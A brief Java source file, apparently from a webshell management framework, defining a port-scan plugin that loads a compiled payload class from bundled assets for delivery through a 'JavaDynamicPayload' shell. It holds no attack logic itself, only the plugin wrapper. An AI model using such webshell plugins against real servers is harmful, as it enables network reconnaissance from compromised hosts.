package shells.plugins.java;

import core.annotation.PluginAnnotation;
import java.io.IOException;
import java.io.InputStream;
import shells.plugins.generic.PortScan;
import util.functions;

@PluginAnnotation(
   payloadName = "JavaDynamicPayload",
   Name = "PortScan",
   DisplayName = "端口扫描"
)
public class JPortScan extends PortScan {
   private static final String CLASS_NAME = "plugin.JPortScan";

   public byte[] readPlugin() throws IOException {
      InputStream inputStream = this.getClass().getResourceAsStream(String.format("assets/%s.classs", "plugin.JPortScan".substring("plugin.JPortScan".indexOf(".") + 1)));
      return functions.readInputStreamAutoClose(inputStream);
   }

   public String getClassName() {
      return "plugin.JPortScan";
   }
}
